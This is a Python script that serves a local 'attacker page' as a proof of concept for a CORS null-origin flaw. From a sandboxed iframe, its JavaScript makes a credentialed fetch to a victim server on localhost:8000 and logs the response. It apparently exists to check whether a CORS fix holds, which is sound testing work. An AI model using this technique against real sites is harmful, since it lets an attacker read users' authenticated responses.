import http.server
import socketserver

PORT = 8001

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
        <html>
        <body>
          <h1>Attacker Page</h1>
          <p>Trying to steal cookies via null origin...</p>
          <script>
            // This runs with Origin: null when loaded in a sandboxed iframe
            fetch('http://localhost:8000/', { credentials: 'include' })
              .then(r => r.text())
              .then(text => {
                console.log('✅ SUCCESS: Stole response from victim!');
                console.log('Response snippet:', text.slice(0, 200));
                alert('Cookie was sent! Check browser console.');
              })
              .catch(e => {
                console.error('❌ FAILED:', e.message);
                alert('Request blocked. CORS may be fixed.');
              });
          </script>
        </body>
        </html>
        ''')

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Attacker server running at http://localhost:{PORT}")
        httpd.serve_forever()